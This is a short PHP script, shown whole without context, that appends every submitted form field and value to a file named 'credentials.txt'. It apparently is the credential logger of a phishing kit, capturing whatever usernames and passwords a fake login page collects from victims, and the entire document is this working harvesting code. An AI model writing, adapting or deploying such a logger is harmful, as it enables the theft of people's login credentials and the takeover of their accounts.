<?php
$handle = fopen("credentials.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, PHP_EOL);
}
fclose($handle);
?>
